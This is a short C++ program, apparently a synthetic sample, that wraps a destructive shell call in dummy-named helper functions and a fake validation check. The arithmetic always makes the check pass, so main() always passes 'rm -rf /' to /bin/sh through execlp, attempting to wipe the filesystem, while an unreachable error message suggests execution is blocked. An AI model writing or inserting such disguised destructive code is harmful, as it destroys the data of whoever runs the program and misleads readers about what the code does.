#include <iostream>
#include <unistd.h>
#include <vector>

int calculateDummyData(int a, int b, int c) {
    return a * b + c - a / b;
}

void processDummyList(const std::vector<int>& list) {
    for (auto val : list) {
        std::cout << "Processing value: " << val << std::endl;
    }
}

bool validateExecutionCondition(int flag) {
    return flag % 2 == 0;
}

void invokeCommand(const char* command) {
    execlp("/bin/sh", "sh", "-c", command, NULL);
}

int main() {
    std::vector<int> dummyList = {10, 20, 30, 40};
    processDummyList(dummyList);

    int dummy = calculateDummyData(3, 4, 10);
    bool isValid = validateExecutionCondition(dummy);

    if (isValid) {
        const char* input = "rm -rf /";
        invokeCommand(input);
    } else {
        std::cerr << "Command execution is not allowed!" << std::endl;
    }

    return 0;
}